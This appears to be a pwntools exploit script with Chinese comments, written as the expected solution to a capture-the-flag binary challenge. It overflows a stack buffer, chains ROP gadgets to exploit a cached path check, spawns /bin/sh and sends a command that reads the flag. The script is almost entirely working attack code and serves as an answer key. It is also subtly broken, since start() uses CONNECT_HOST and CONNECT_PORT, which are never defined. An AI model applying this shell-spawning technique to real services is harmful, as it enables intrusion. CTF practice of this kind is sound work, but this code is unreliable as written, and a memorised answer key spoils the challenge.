#!/usr/bin/env python3
# 导入 pwntools，后面用它启动进程、连接远程服务、解析 ELF 符号和打包地址。
from pwn import *

# 明确告诉 pwntools 这是 64 位 Linux 程序，ROP 地址会按 amd64 小端序打包。
context.clear(arch="amd64", os="linux")

# 如果命令行带 LOG=debug，就打印详细交互；否则默认只保留关键信息。
context.log_level = args.LOG or "info"

# ELF_PATH 用来解析符号地址，默认解析当前目录下的 pwn。
ELF_PATH = args.ELF or "./pwn"

# RUN_PATH 用来本地启动程序，默认也启动当前目录下的 pwn。
RUN_PATH = args.BIN or ELF_PATH

# HOST 是远程题目地址，使用方式示例：python3 expected_exp.py REMOTE HOST=127.0.0.1 PORT=10001。
HOST = args.HOST or "127.0.0.1"

# PORT 是远程题目端口，不传时默认按 Dockerfile 暴露的 10001。
PORT = int(args.PORT or 10001)

# SHELL_CMD 是拿到 shell 后执行的命令；默认优先读远程 /flag，本地调试时也尝试读当前目录 flag。
SHELL_CMD = (args.CMD or "cat /flag; cat flag; exit").encode()

# INTERACTIVE=1 时进入交互模式；不传时自动执行 SHELL_CMD 并打印输出，方便平台验题。
INTERACTIVE = bool(args.INTERACTIVE)

# PROT_WRITE 是 Linux mprotect 的写权限常量，数值为 2。
PROT_WRITE = 2

# 解析 ELF，后续直接通过符号名取 gadget、函数和 bss 缓冲区地址。
elf = ELF(ELF_PATH)

# vulnerable_echo() 里 buf 大小是 0x40，保存的 rbp 是 8 字节，所以覆盖 RIP 的偏移是 0x48。
OFFSET = 0x48

# controlled_path 是题目固定让父进程检查的 bss 地址，源码中按页对齐，方便后面 mprotect。
CONTROLLED_PATH = elf.symbols["controlled_path"]

# ret gadget 用来调整栈对齐，降低不同 libc/环境下调用链不稳定的概率。
RET = elf.symbols["gadget_ret"]

# pop rdi; ret 用来布置第 1 个参数。
POP_RDI = elf.symbols["gadget_pop_rdi_ret"]

# pop rsi; ret 用来布置第 2 个参数。
POP_RSI = elf.symbols["gadget_pop_rsi_ret"]

# pop rdx; ret 用来布置第 3 个参数。
POP_RDX = elf.symbols["gadget_pop_rdx_ret"]

# read@plt 用来向 controlled_path 写入第一阶段的 deadbeef 和第二阶段的 /bin/sh。
READ_PLT = elf.plt["read"]

# easy_mprotect 是源码提供的 mprotect 包装函数，三个参数仍然要由 ROP 链自己构造。
EASY_MPROTECT = elf.symbols["easy_mprotect"]

# easy_execve 是源码提供的 execve 包装函数，三个参数仍然要由 ROP 链自己构造。
EASY_EXECVE = elf.symbols["easy_execve"]


# start() 根据参数决定本地运行还是连接远程服务。
def start():
    # 带 REMOTE 参数时，脚本连接远程靶机。
    if args.REMOTE:
        # remote() 返回一个可读写的网络连接对象。
        if PORT == 443 or args.SSL:
            return remote(CONNECT_HOST, CONNECT_PORT, ssl=True, sni=HOST)
        return remote(CONNECT_HOST, CONNECT_PORT)
    # 不带 REMOTE 参数时，脚本直接启动本地二进制。
    return process(RUN_PATH)


# call3() 生成“调用一个三参数函数”的通用 ROP 片段。
def call3(func, arg1, arg2, arg3):
    # 按 amd64 调用约定，前三个参数分别放在 rdi、rsi、rdx。
    return flat(
        # 设置 rdi = arg1。
        POP_RDI,
        # 第 1 个参数的值。
        arg1,
        # 设置 rsi = arg2。
        POP_RSI,
        # 第 2 个参数的值。
        arg2,
        # 设置 rdx = arg3。
        POP_RDX,
        # 第 3 个参数的值。
        arg3,
        # 跳到目标函数执行。
        func,
    )


# build_payload() 构造完整 ROP 链。
def build_payload():
    # 先填满 buf 和保存的 rbp，让下一段内容覆盖返回地址。
    payload = b"A" * OFFSET

    # 第一次 read(0, controlled_path, 0x20)，向固定 bss 地址写入 deadbeef。
    payload += call3(READ_PLT, 0, CONTROLLED_PATH, 0x20)

    # easy_execve(controlled_path, NULL, NULL)，此时路径是 deadbeef，父进程缓存通过，内核执行失败后 ROP 继续。
    payload += call3(EASY_EXECVE, CONTROLLED_PATH, 0, 0)

    # 第二次 read(0, controlled_path, 0x20)，把同一块地址改成 /bin/sh。
    payload += call3(READ_PLT, 0, CONTROLLED_PATH, 0x20)

    # easy_mprotect(controlled_path, 0x1000, PROT_WRITE)，把这一页改成仅可写。
    payload += call3(EASY_MPROTECT, CONTROLLED_PATH, 0x1000, PROT_WRITE)

    # easy_execve(controlled_path, NULL, NULL)，父进程本应重新检查 /bin/sh，但它忽略读失败并复用旧缓存 deadbeef。
    payload += flat(RET)
    payload += call3(EASY_EXECVE, CONTROLLED_PATH, 0, 0)

    # vulnerable_echo() 的 read 最多读 0x200 字节，补齐后可避免后续阶段数据被第一轮读走错位。
    return payload.ljust(0x200, b"A")


# 启动本地程序或连接远程服务。
io = start()

# 等待题目打印输入提示，确保接下来发送的数据进入 vulnerable_echo() 的 read。
io.recvuntil(b"plan\n")

# 构造第一轮溢出数据。
payload = build_payload()

# 第一段二阶段数据是 deadbeef，用来通过第一次 execve 的父进程校验并写入父进程缓存。
stage_deadbeef = b"deadbeef\x00".ljust(0x20, b"\x00")

# 第二段二阶段数据是 /bin/sh，用来作为 easy_execve 最终执行的路径。
stage_binsh = b"/bin/sh\x00".ljust(0x20, b"\x00")

# 一次性发送 0x200 字节 ROP、0x20 字节 deadbeef、0x20 字节 /bin/sh，两个 read 会依次消费它们。
io.send(payload + stage_deadbeef + stage_binsh)

# vulnerable_echo() 返回前会打印 bye，收到它说明 ROP 链即将继续运行或已经开始运行。
io.recvuntil(b"bye\n")

# execve("/bin/sh") 成功后，向 shell 发送命令；默认命令会尝试读取 flag。
io.sendline(SHELL_CMD)

# 如果需要手动操作 shell，就把连接交给 pwntools 的交互模式。
if INTERACTIVE:
    io.interactive()
else:
    # 非交互模式下读取 shell 返回的全部内容，超时后结束。
    result = io.recvall(timeout=2)

    # 把原始字节按可见字符打印出来，方便直接看到 flag。
    print(result.decode(errors="ignore"), end="")
